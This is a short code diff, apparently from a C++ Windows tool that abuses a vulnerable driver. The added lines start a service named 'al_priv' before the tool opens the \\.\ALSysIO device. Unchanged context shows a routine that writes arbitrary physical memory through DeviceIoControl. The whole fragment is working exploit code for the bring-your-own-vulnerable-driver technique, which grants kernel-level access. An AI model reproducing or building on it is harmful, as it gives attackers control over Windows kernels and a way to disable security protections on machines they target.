@@ -36,6 +36,9 @@ namespace driver_util {
         std::size_t hk_addr{};
 
         driver() noexcept {
+            const auto sc_manager = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+            const auto new_svc = OpenServiceA(sc_manager, "al_priv", SC_MANAGER_ALL_ACCESS);
+            StartServiceA(new_svc, 0, nullptr);
             util::log("%s", "Opening handle to vulnerable driver...");
             do {
                 this->drv_handle = CreateFileA("\\\\.\\ALSysIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
@@ -80,7 +83,6 @@ namespace driver_util {
         [[nodiscard]] bool write_phys_mem(std::size_t physical_addr, void* buf) const {
             write_data<buf_sz> wr_data{ physical_addr, buf_sz };
             std::memcpy(&wr_data.buf, buf, buf_sz);
-
             unsigned long bytes_returned{};
             const auto status = DeviceIoControl(drv_handle, ctl_codes::write_ctl, &wr_data, buf_sz, nullptr, buf_sz, &bytes_returned, nullptr);
             if (!status)
